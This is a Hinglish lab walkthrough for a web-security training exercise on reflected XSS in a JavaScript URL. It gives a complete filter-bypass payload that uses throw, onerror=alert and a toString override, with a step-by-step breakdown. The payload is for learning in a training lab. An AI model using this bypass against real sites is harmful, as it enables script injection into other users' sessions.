## Reflected XSS in a JavaScript URL with some characters blocked

🔥 Goal:

Page ke andar aisa XSS payload inject karna hai jo:

alert(1337)

show kare — lekin kuch characters block kiye gaye hain jaise spaces ( ), brackets (( )), etc.


---

🧠 Concept Samajho:

1. Reflected XSS hai — toh jo hum URL mein bhejte hain, woh page mein JavaScript ke andar reflect hota hai.


2. Characters block kiye gaye hain — toh direct alert(1337) likhna allowed nahi.


3. Trick yeh hai ke hum throw ka use kar ke XSS fire karwate hain by overriding window.toString.

---

✅ Final Payload:

```
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```

Replace YOUR-LAB-ID with apna actual lab ID.

---

🪜 Step-by-Step Explanation:

1. Kaam ka hisa (payload breakdown):

```
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

Breakdown:

x=x=>{} => ek arrow function define kiya.

throw/**/onerror=alert,1337 =>

throw exception fenkta hai

onerror=alert JavaScript ka built-in error handler hai

,1337 is part of the expression

toString=x => window object ka .toString method ko overwrite kiya gaya

window+'' => Jab hum window object ko string banate hain (force conversion), toString() call hota hai — jo ab hamara malicious function hai!

---

🖱️ Last Step (Important):

Click "Back to blog" — yeh click trigger karta hai JavaScript execution ko.

---

💡 Penetration Testing Tip:

Yeh payload show karta hai ke agar app kuch characters block kare, tab bhi JavaScript ke tricky features jaise:

throw

onerror

arrow functions x=>{}

property override (toString)

string coercion (window+"") ...ka use kar ke XSS possible hai.

Iska matlab real-life mein agar tum dekho ke <script> tag block hai ya brackets block hain, toh creative ways se tum XSS fire kar sakte ho.

---

🔚 TL;DR:

Yeh lab throw aur onerror ka use karke alert(1337) call karta hai.

toString ko override karke execution trigger hoti hai.

Sab kuch URL ke query parameters mein inject hota hai.

Final payload tab execute hota hai jab user "Back to blog" pe click karta hai.
